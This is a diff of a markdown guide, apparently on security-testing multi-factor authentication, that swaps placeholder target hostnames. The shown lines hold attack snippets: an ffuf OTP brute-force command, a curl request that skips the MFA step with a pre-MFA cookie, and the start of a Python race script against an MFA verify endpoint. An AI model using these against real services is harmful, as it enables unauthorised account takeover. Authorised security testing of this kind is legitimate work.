@@ -43,7 +43,7 @@ This is the go-to when there is no leaked code and no skip/replay path. Some app
 ### Pattern 1: No Rate Limit on OTP
 ```bash
 # Test with ffuf — all 1M 6-digit codes
-ffuf -u "https://target.com/api/verify-otp" \
+ffuf -u "https://target.example/api/verify-otp" \
   -X POST -H "Content-Type: application/json" \
   -H "Cookie: session=YOUR_SESSION" \
   -d '{"otp":"FUZZ"}' \
@@ -72,7 +72,7 @@ ffuf -u "https://target.com/api/verify-otp" \
 # After entering password, app sets a "pre-mfa" cookie → redirects to /mfa
 # Test: skip /mfa entirely, access /dashboard directly with pre-mfa cookie
 # If app grants access without MFA = auth flow bypass = Critical
-curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
+curl -s -b "session=PRE_MFA_SESSION" https://target.example/dashboard
 ```
 
 ### Pattern 5: Race on MFA Verification
@@ -80,7 +80,7 @@ curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
 import asyncio, aiohttp
 
 async def verify(session, otp):
-    async with session.post("https://target.com/api/mfa/verify",
+    async with session.post("https://target.example/api/mfa/verify",
                             json={"otp": otp}) as r:
         return r.status, await r.text()
 
